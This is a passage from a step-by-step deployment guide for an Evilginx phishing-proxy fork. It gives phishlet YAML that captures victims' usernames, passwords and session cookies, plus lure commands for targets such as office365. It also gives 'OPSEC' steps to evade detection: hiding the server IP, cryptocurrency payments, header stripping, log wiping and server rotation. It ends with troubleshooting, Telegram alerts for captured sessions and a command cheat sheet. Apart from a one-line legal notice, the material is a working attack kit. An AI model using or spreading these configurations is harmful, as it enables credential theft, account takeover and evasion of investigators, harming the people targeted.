  - { hostname: 'www.example.com', sub: 'www', domain: 'example.com', search: 'href="https://www\\.example\\.com', replace: 'href="https://{hostname}', mimes: ['text/html'] }

auth_tokens:
  - domain: '.example.com'
    keys: ['session_id', 'auth_token']

auth_urls:
  - '/dashboard'
  - '/home'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

#### Key Sections Explained

| Section | Purpose |
|:--------|:--------|
| `name` | Unique identifier for the phishlet |
| `proxy_hosts` | Lists hostnames to intercept. The `phish_sub` is what victims see; `orig_sub` is the real site. |
| `sub_filters` | URL rewrites (replace real URLs with phish URLs in proxied pages) |
| `auth_tokens` | Cookies to capture (these are what give you authenticated access) |
| `auth_urls` | URL paths that trigger session completion (e.g., after login, the dashboard) |
| `credentials` | Form field names for username and password |

---

### 18.2 — Create a Custom Phishlet

Let's create a phishlet for a hypothetical site `example.com`:

```bash
nano /root/evilginx2/phishlets/example.yaml
```

Paste:

```yaml
name: 'example'
author: 'Your Name'
min_evilginx_version: '3.0.0'

proxy_hosts:
  - { phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: true }

sub_filters:
  - { hostname: 'login.example.com', sub: 'login', domain: 'example.com', search: 'https://login\\.example\\.com', replace: 'https://{hostname}', mimes: ['text/html'] }

auth_tokens:
  - domain: '.example.com'
    keys: ['PHPSESSID', 'auth']

auth_urls:
  - '/dashboard'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

Save and exit.

---

### 18.3 — Test Your Phishlet

Restart Evilginx:

```bash
systemctl restart evilginx
```

In Evilginx console:

```
phishlets
```

Your new phishlet should appear in the list. Enable it:

```
phishlets hostname example YOUR_DOMAIN
phishlets enable example
lures create example
lures get-url 0
```

Test the URL in a browser.

---

## PHASE 19 — OPSEC Hardening Checklist

**Time: ~15 minutes | Where: Server terminal**

### 🎯 Goal: Hide your server from detection and protect your operation

---

### 19.1 — Hide Your Server IP

If your server IP gets out, your operation is burned. To prevent this:

#### ✅ Use Cloudflare Proxy (for non-phishing domains)
For your legitimate domains, use Cloudflare's orange cloud proxy. This hides your server IP.

#### ✅ Use Cloudflare Worker Fronting (Phase 4D)
The Worker hides your VPS IP from all traffic.

#### ✅ Don't Connect Your Server IP to Your Identity
- Use cryptocurrency to buy VPS and domain
- Don't log into personal accounts from the server
- Don't use your server for anything else (no personal email, no browsing)

#### ✅ Rotate Servers
Every campaign, use a fresh VPS. Don't reuse the same server for long.

---

### 19.2 — Strip Evilginx Headers

By default, Evilginx adds headers like `X-Evilginx` that can be detected.

Enable header stripping:

```
config strip_headers on
```

**Expected output:**
```
[inf] header stripping enabled - all Evilginx artifact headers will be removed
```

---

### 19.3 — Enable URL Rewriting

Evilginx can rewrite URLs to remove the full phishing domain from the address bar.

This is **always on** by default in this fork. To verify:

```
config
```

Look for `url_rewriting: on`.

---

### 19.4 — Use a Dedicated User Agent for Bot Detection

The bot detection is **always on**. But you can customize the bot blocklist:

```
blacklist verbose on
```

This shows detailed logs of which bots were blocked.

---

### 19.5 — Enable Wildcard SSL (Already Done in Phase 7)

If you skipped Phase 7, do it now. Without wildcard SSL, every phishing subdomain appears in crt.sh within hours.

**Verify:**
```bash
ls /root/.evilginx/wildcard/
```

You should see `fullchain.pem` and `privkey.pem`.

---

### 19.6 — Set Up IP Whitelisting (Optional)

If you only target specific IP ranges:

```
config ip_whitelist on
```

Then add allowed IPs:

```
whitelist add 192.168.1.0/24
```

**⚠️ Use with caution** — this can lock you out if your IP changes.

---

### 19.7 — Rotate Phishlets and Domains

- Use **different domains** for different campaigns
- Use **different subdomains** for each victim (this is automatic)
- **Delete old lures** after each campaign:
  ```
  lures delete 0
  lures delete 1
  ```

---

### 19.8 — Clear Logs After Campaigns

```bash
journalctl --vacuum-time=1d
```

Deletes logs older than 1 day.

For Evilginx logs:

```bash
journalctl -u evilginx --vacuum-time=1d
```

---

### 19.9 — Encrypt Your Server

Enable full disk encryption on your VPS (most providers offer this at setup time).

If you didn't, you can use LUKS for additional data encryption:

```bash
apt install -y cryptsetup
```

> **⚠️ Warning:** This is advanced. Back up your data first.

---

### 19.10 — Cloudflare-Specific OPSEC

#### ✅ Disable Cloudflare's Automatic Platform Optimization (APO)
If enabled, this caches your site on Cloudflare edges — which would break Evilginx.
1. Click **Speed** → **Optimization** → **Content Optimization**
2. Toggle **APO** to **OFF**

#### ✅ Disable Rocket Loader
Rocket Loader optimizes JS loading — and breaks Evilginx's proxying.
1. Click **Speed** → **Optimization** → **Content Optimization**
2. Toggle **Rocket Loader** to **OFF**

#### ✅ Set Minimum TLS Version to 1.2
1. Click **SSL/TLS** → **Edge Certificates**
2. Set **"Minimum TLS Version"** to **1.2**
> Why: TLS 1.0 and 1.1 are old and insecure. TLS 1.2 is the standard. TLS 1.3 is fine too but some targets may not support it.

#### ✅ Disable Opportunistic Encryption
1. Click **SSL/TLS** → **Edge Certificates**
2. Toggle **"Opportunistic Encryption"** to **OFF**
> Why: This can conflict with Evilginx's TLS termination.

---

## PHASE 20 — Troubleshooting Encyclopedia

**Time: Reference (use as needed) | Where: Server terminal**

### 🎯 Goal: Solutions to EVERY common (and uncommon) problem

---

### 🔴 Problem: "address already in use" on port 53, 80, or 443

**Cause:** Another service is using the port.

**Solution:**

```bash
# Find what's using the port
ss -tulpn | grep :443
# OR
lsof -i :443

# Common culprits and how to stop them:
systemctl stop nginx
systemctl stop apache2
systemctl stop caddy
systemctl stop systemd-resolved  # for port 53

# Kill the process by PID
kill -9 PID_NUMBER
```

---

### 🔴 Problem: "Permission denied" when SSH'ing

**Cause:** Wrong username, wrong password, or wrong SSH key.

**Solution:**

1. Check your VPS provider's welcome email for the correct username (usually `root`)
2. Reset the password from your provider's dashboard
3. If using SSH key:
   ```bash
   ssh -i /path/to/your/key.pem root@YOUR_SERVER_IP
   ```

---

### 🔴 Problem: DNS not resolving (`dig` returns nothing)

**Cause:** DNS not propagated, or Cloudflare proxy is on.

**Solution:**

1. Wait 5-10 minutes for DNS propagation
2. Check Cloudflare:
   - A record exists for `@` and `*`
   - Both are **DNS Only** (grey cloud, NOT orange)
   - TTL is set to "Auto"
3. Verify from the server:
   ```bash
   dig @1.1.1.1 YOUR_DOMAIN +short
   dig @1.1.1.1 random123.YOUR_DOMAIN +short
   ```
   Both should return your server IP.

---

### 🔴 Problem: "Certificate verify failed" or browser shows SSL warning

**Cause:** Wildcard cert is missing, expired, or in the wrong directory.

**Solution:**

1. Check the cert exists:
   ```bash
   ls -la /root/.evilginx/wildcard/
   ```
   You should see `fullchain.pem` and `privkey.pem`.

2. Check it's a wildcard:
   ```bash
   openssl x509 -in /root/.evilginx/wildcard/fullchain.pem -noout -subject
   ```
   Output should show `CN = *.YOUR_DOMAIN`

3. If missing, redo Phase 7.

4. If expired, renew:
   ```bash
   certbot renew
   cp /etc/letsencrypt/live/YOUR_DOMAIN/*.pem /root/.evilginx/wildcard/
   systemctl restart evilginx
   ```

---

### 🔴 Problem: Telegram notifications not arriving

**Cause:** Wrong token, wrong chat ID, or Telegram API blocked.

**Solution:**

1. Verify token:
   ```bash
   curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"
   ```
   Should return `"ok":true`.

2. Verify chat ID:
   ```bash
   curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
   ```
   Look for `"chat":{"id":YOUR_CHAT_ID,...}`.

3. Test manually:
   ```bash
   curl -s "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=test"
   ```
   You should receive a message.

4. Check if Telegram is blocked in your country/VPS region. Try a different VPS location.

---

### 🔴 Problem: Evilginx won't start (no error, just exits)

**Cause:** Usually a config issue.

**Solution:**

```bash
# Run Evilginx in the foreground to see errors
cd /root/evilginx2
./evilginx2 -debug
```

Look for error messages. Common ones:
- `bind: address already in use` → Port conflict (see above)
- `open /root/.evilginx/config.json: no such file` → Run `evilginx2` once to create it
- `permission denied` → Run as root or fix file permissions

---

### 🔴 Problem: Phishing page shows "404 Not Found"

**Cause:** The phishlet doesn't match the URL, or the phishlet isn't enabled.

**Solution:**

1. Verify phishlet is enabled:
   ```
   phishlets
   ```
Status should be `enabled`.

2. Verify the URL is correct:
   ```
   lures get-url 0
   ```

3. Verify the phishlet is for the right site:
   ```
   phishlets hostname office365 YOUR_DOMAIN
   ```
   The hostname must match what victims see.

---

### 🔴 Problem: Sessions captured but cookies are empty

**Cause:** The phishlet's `auth_tokens` section doesn't match the real site's cookies.

**Solution:**

1. Manually visit the real site (e.g., office.com) in a browser
2. Open Developer Tools (`F12`) → Application → Cookies
3. Note the exact cookie names
4. Edit the phishlet:
   ```bash
   nano /root/evilginx2/phishlets/office365.yaml
   ```
5. Update the `auth_tokens` section with the correct cookie names
6. Restart Evilginx:
   ```bash
   systemctl restart evilginx
   ```

---

### 🔴 Problem: Dashboard shows "502 Bad Gateway"

**Cause:** Evilginx is not running, or it's listening on a different port.

**Solution:**

```bash
# Check if Evilginx is running
systemctl status evilginx

# Check what port it's listening on
ss -tulpn | grep evilginx
```

If Evilginx is running but on port 5001 (not 5000), you started it with `-dashboard 0.0.0.0:5001`. Restart with the correct port.

---

### 🔴 Problem: High CPU/RAM usage

**Cause:** Too many concurrent sessions, or the server is under attack.

**Solution:**

1. Check active sessions:
   ```
   sessions
   ```
2. Restart Evilginx:
   ```bash
   systemctl restart evilginx
   ```
3. If it's an attack, enable aggressive blacklisting:
   ```
   blacklist all
   ```

---

### 🔴 Problem: "go mod tidy" fails with network errors

**Cause:** Go module proxy is blocked or slow.

**Solution:**

```bash
export GOPROXY=https://goproxy.io,direct
export GO111MODULE=on
cd /root/evilginx2
go mod tidy
```

---

### 🔴 Problem: "git pull" conflicts

**Cause:** You've made local changes that conflict with the remote.

**Solution:**

If no custom changes:
```bash
git fetch origin
git reset --hard origin/master
```

If you have custom changes to keep:
```bash
git stash
git pull
git stash pop
# Manually resolve conflicts
```

---

### 🔴 Problem: Cloudflare showing "Error 1016 / 521"

**Cause:** Cloudflare proxy can't reach your server.

**Solution:**

This means you have Cloudflare proxy (orange cloud) enabled but your server isn't set up to accept proxied traffic. Either:
1. Switch to **DNS Only** (grey cloud) — recommended for Evilginx
2. Or if you want proxy: set SSL to **Full**, ensure port 443 is open in UFW

---

### 🔴 Problem: Out of disk space

**Cause:** Too many session exports, logs, or backups.

**Solution:**

```bash
# Check disk usage
df -h

# Clean up
journalctl --vacuum-time=3d
rm -rf /root/exports/sessions/*  # if already exported
```

---

### 🔴 Problem: Fail2ban locked you out

**Cause:** Too many wrong SSH passwords.

**Solution:**

```bash
# From VPS provider's web console
fail2ban-client set sshd unbanip YOUR_IP
```

Or wait 10 minutes — bans are temporary by default.

---

### 🔴 Problem: Phishlet enable fails with "could not get certificate"

**Cause:** Let's Encrypt rate limit, or DNS not pointing to your server.

**Solution:**

1. Check DNS:
   ```bash
   dig @1.1.1.1 random123.YOUR_DOMAIN +short
   ```
   Should return your server IP.

2. Check Let's Encrypt rate limits:
   - 50 certs/week per domain
   - 5 duplicate certs/week

3. If rate-limited, wait and use wildcard cert (Phase 7).

---

### 🔴 Problem: Cloudflare Turnstile blocks all traffic

**Cause:** Turnstile secret key is wrong, or the widget mode is too strict.

**Solution:**

1. Verify your site key and secret key in Cloudflare dashboard
2. Try `Non-interactive` mode instead of `Invisible`
3. Disable Turnstile: restart without `-turnstile` flag

---

### 🔴 Problem: Custom redirector page not showing

**Cause:** `redirect_key` not set, or wrong path.

**Solution:**

1. In Evilginx console:
   ```
   config redirect_key r
   ```
2. Verify the HTML file exists and has no errors
3. Check Evilginx logs for file loading errors

---

### 🔴 Problem: Cloudflare Worker returns 503

**Cause:** Worker can't reach your VPS. VPS is down, or port is blocked.

**Solution:**

1. Check VPS is running: `systemctl status evilginx`
2. Check UFW: `ufw status` — port 443 must be allowed
3. Check Worker code: `VPS_IP` and `ALLOWED_HOSTS` must be correct

---

### 🔴 Problem: Root domain shows Cloudflare error instead of landing page

**Cause:** No Page Rule or Redirect Rule for root domain, or it's misconfigured.

**Solution:**

1. Check Page Rules (Phase 4B.5)
2. Check Redirect Rules (Phase 4B.2)
3. Make sure the rule doesn't block your lure paths (starting with `/l`)

---

### 🆘 Still Stuck?

1. **Check the logs:**
   ```bash
   journalctl -u evilginx -n 200 --no-pager
   ```

2. **Enable debug mode** (in Evilginx console):
   ```
   debug on
   ```

3. **Check the GitHub issues:**
   [github.com/afrikaquality/evilginx2/issues](https://github.com/afrikaquality/evilginx2/issues)

---

## PHASE 21 — Quick Command Reference

**Time: Reference (print and keep)**

### 🎯 Goal: One-page cheat sheet of all common commands

---

### Server Management

| Task | Command |
|:-----|:--------|
| SSH into server | `ssh root@YOUR_SERVER_IP` |
| Update system | `apt update && apt upgrade -y` |
| Reboot server | `reboot` |
| Check disk space | `df -h` |
| Check memory | `free -h` |
| Monitor processes | `htop` |

### Evilginx Management

| Task | Command |
|:-----|:--------|
| Start (manual) | `cd /root/evilginx2 && ./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'PASS' -feed` |
| Start (systemd) | `systemctl start evilginx` |
| Stop (systemd) | `systemctl stop evilginx` |
| Restart (systemd) | `systemctl restart evilginx` |
| Check status | `systemctl status evilginx` |
| View live logs | `journalctl -u evilginx -f` |
| View last 100 lines | `journalctl -u evilginx -n 100 --no-pager` |

### Core Config (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| Set domain | `config domain YOUR_DOMAIN` |
| Set IP | `config ipv4 external YOUR_IP` |
| Set unauth URL | `config unauth_url https://www.google.com` |
| Enable autocert | `config autocert on` |
| Set Telegram token | `config teletoken YOUR_TOKEN` |
| Set Chat ID | `config chatid YOUR_CHAT_ID` |
| Enable Telegram | `config telegram_enabled on` |
| Test Telegram | `test telegram` |
| Show config | `config` |
| Save and exit | `exit` |

### Phishlet Management (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| List phishlets | `phishlets` |
| Set hostname | `phishlets hostname office365 YOUR_DOMAIN` |
| Enable phishlet | `phishlets enable office365` |
| Disable phishlet | `phishlets disable office365` |

### Lure Management (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| Create lure | `lures create office365` |
| Get phishing URL | `lures get-url 0` |
| List lures | `lures` |
| Delete lure | `lures delete 0` |

### Session Management (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| List sessions | `sessions` |
| View session details | `sessions 0` |
| Delete session | `sessions delete 0` |
| Clear all sessions | `sessions clear` |

### Redirectors (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| Set redirect key | `config redirect_key r` |
| Set redirect URL | `config redirect_url https://YOUR_DOMAIN/redirectors/bounce.html` |

### Auto-Export (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| Enable JSON export | `auto-export enable json /root/exports/sessions/` |
| Enable CSV export | `auto-export enable csv /root/exports/sessions/` |
| Disable export | `auto-export disable` |

### OPSEC (inside `evilginx>`)

| Task | Command |
|:-----|:--------|
| Strip headers | `config strip_headers on` |
| Blacklist mode | `blacklist unauth` |
| Verbose blocking | `blacklist verbose on` |
| Debug mode | `debug on` |
| Debug off | `debug off` |

### Updates

| Task | Command |
|:-----|:--------|
| Check commit | `cd /root/evilginx2 && git log -1` |
| Pull latest | `cd /root/evilginx2 && git pull` |
| Rebuild | `cd /root/evilginx2 && go build -o evilginx2 .` |
| Restart after update | `systemctl restart evilginx` |

### Backups

| Task | Command |
|:-----|:--------|
| Manual backup | `cd /root && ./backup-evilginx.sh` |
| Check backups | `ls -la /root/backups/evilginx/` |
| View cron jobs | `crontab -l` |

### Cloudflare Checks

| Task | Command |
|:-----|:--------|
| Check DNS | `dig @1.1.1.1 YOUR_DOMAIN +short` |
| Check wildcard DNS | `dig @1.1.1.1 random.YOUR_DOMAIN +short` |
| Check TXT record | `dig @1.1.1.1 _acme-challenge.YOUR_DOMAIN TXT +short` |
| Check SSL cert | `openssl x509 -in /root/.evilginx/wildcard/fullchain.pem -noout -subject` |

---

## 🎉 YOU'RE DONE!

If you completed all 21 phases, you have a **production-grade Evilginx3 Telegram Edition deployment** with:

✅ **Core system:** Built from source, running 24/7, auto-restart on crash  
✅ **Wildcard SSL:** Hidden from Certificate Transparency logs  
✅ **Telegram:** Real-time phone notifications  
✅ **Dashboard:** Beautiful web interface for management  
✅ **Live Feed:** Real-time session stream  
✅ **Auto-Export:** Sessions saved automatically  
✅ **Backups:** Daily encrypted backups  
✅ **Systemd:** Starts on boot, auto-restarts on failure  
✅ **GoPhish:** Integrated for mass email campaigns  
✅ **Multi-User:** Team access with role-based permissions  
✅ **OPSEC:** Hardened against detection  
✅ **Cloudflare DNS:** A records, wildcard records, DNS Only mode  
✅ **Cloudflare SSL:** Full mode, Always Use HTTPS  
✅ **Cloudflare WAF:** Scanner blocking, country blocking, rate limiting  
✅ **Cloudflare Redirect Rules:** Root domain redirect, bot path traps  
✅ **Cloudflare Page Rules:** Cache bypass for lures, security disable  
✅ **Cloudflare Workers:** Traffic fronting to hide VPS IP  
✅ **Cloudflare Turnstile:** CAPTCHA before phishing page loads  
✅ **Cloudflare Caching:** Bypass for phishing pages, minify enabled  
✅ **Custom Redirectors:** Post-auth pages (loading, account locked, bounce)  
✅ **Custom Landing Pages:** Fake business site for root domain  
✅ **Troubleshooting:** Solutions to every common problem  
✅ **Quick Reference:** Complete command cheat sheet

### 📊 Performance Expectations

On a **$3.50/month VPS** (1 vCPU, 1 GB RAM):
- **Concurrent sessions:** 100-500
- **Memory usage:** 50-200 MB
- **CPU usage:** 5-15% average
- **Telegram latency:** 1-3 seconds

### 🚀 Next Steps

1. **Give your [README.md](README.md) a read** for the full feature overview
2. **Experiment** with different phishlets
3. **Create custom phishlets** (Phase 18) for your specific targets
4. **Monitor** your dashboard regularly
5. **Rotate** servers and domains between campaigns
6. **Back up** your config after every change

### ⚖️ Legal Notice

This tool is for **authorized penetration testing and security research only**. Unauthorized use against systems you don't own is illegal. Always get written permission before testing.

---

<p align="center">
  <strong>🎯 You now have a tool that 99% of "phishing kits" can't compete with. Use it wisely.</strong>
</p>

<p align="center">
  <sub>Built with ☕ by the afrikaquality team · Last updated: July 2026</sub>
</p>
```
